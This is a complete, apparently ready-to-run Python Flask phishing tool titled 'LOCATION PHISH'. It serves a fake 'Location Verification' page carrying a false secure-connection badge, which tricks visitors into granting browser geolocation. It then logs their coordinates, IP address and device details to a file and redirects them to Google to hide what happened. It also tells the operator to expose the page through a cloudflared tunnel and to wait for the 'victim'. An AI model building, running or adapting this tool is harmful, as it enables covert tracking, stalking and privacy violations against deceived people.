import os
import threading
from flask import Flask, request, redirect
from datetime import datetime
from pyfiglet import figlet_format


R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
P = '\033[95m'
C = '\033[96m'
W = '\033[97m'
N = '\033[0m'


app = Flask(__name__)


clear = lambda: os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    clear()
    banner = figlet_format("LOCATION PHISH")
    print(f"{R}{banner}{N}")
    print(f"{C}------------------------------------------------------------")
    print(f"{G}TEAM DARK | LOCATION PHISHING TOOL | @ᴺᴼ--N̶ᴀ̶ᴍ̶ᴇ̷")
    print(f"{C}------------------------------------------------------------{N}")


@app.route('/')
def index():
    return '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location Verification</title>
    <style>
        body {
            background: #f0f2f5;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: #fff;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0,0,0,0.2);
            text-align: center;
            width: 90%;
            max-width: 400px;
            animation: fadeIn 1s ease-in-out;
        }
        @keyframes fadeIn {
            0% { opacity: 0; transform: translateY(-20px); }
            100% { opacity: 1; transform: translateY(0); }
        }
        h2 {
            color: #d32f2f;
            margin-bottom: 20px;
        }
        p {
            color: #333;
            margin-bottom: 20px;
        }
        button {
            padding: 10px 20px;
            background: #d32f2f;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background 0.3s;
        }
        button:hover {
            background: #b71c1c;
        }
        .secure-text {
            font-size: 12px;
            color: #888;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Location Verification</h2>
        <p>We need to verify your location to proceed. Please allow location access.</p>
        <button onclick="getLocation()">Allow Location</button>
        <div class="secure-text">🔒 Secure Connection</div>
        <script>
            function getLocation() {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(sendLocation, showError);
                } else {
                    alert("Geolocation is not supported by this browser.");
                }
            }

            function sendLocation(position) {
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;
                fetch('/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ latitude: latitude, longitude: longitude })
                }).then(() => {
                    window.location.href = 'https://www.google.com';
                });
            }

            function showError(error) {
                switch(error.code) {
                    case error.PERMISSION_DENIED:
                        alert("Location access denied. Please allow location access to proceed.");
                        break;
                    case error.POSITION_UNAVAILABLE:
                        alert("Location information is unavailable.");
                        break;
                    case error.TIMEOUT:
                        alert("The request to get location timed out.");
                        break;
                    case error.UNKNOWN_ERROR:
                        alert("An unknown error occurred.");
                        break;
                }
            }
        </script>
    </div>
</body>
</html>
'''


@app.route('/capture', methods=['POST'])
def capture():
    data = request.get_json()
    latitude = data['latitude']
    longitude = data['longitude']
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    log = f"[+] [{datetime.now()}] Location Captured | Latitude: {latitude} | Longitude: {longitude} | IP: {ip_address} | Device: {user_agent}\n"
    print(f"{G}{log}{N}")
    with open('location_log.txt', 'a') as f:
        f.write(log)
    return 'Captured'


def main():
    show_banner()
    port = 5000
    print(f"{Y}Launching phishing page on port: {port}{N}")
    print(f"{G}Run in new session:{N}")
    print(f"{C}cloudflared tunnel --url http://localhost:{port}{N}")
    print(f"{Y}Waiting for victim to allow location... CTRL+C to stop.{N}")
    threading.Thread(target=app.run, args=('0.0.0.0', port)).start()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"{R}\n[!] Exiting...{N}")
        exit()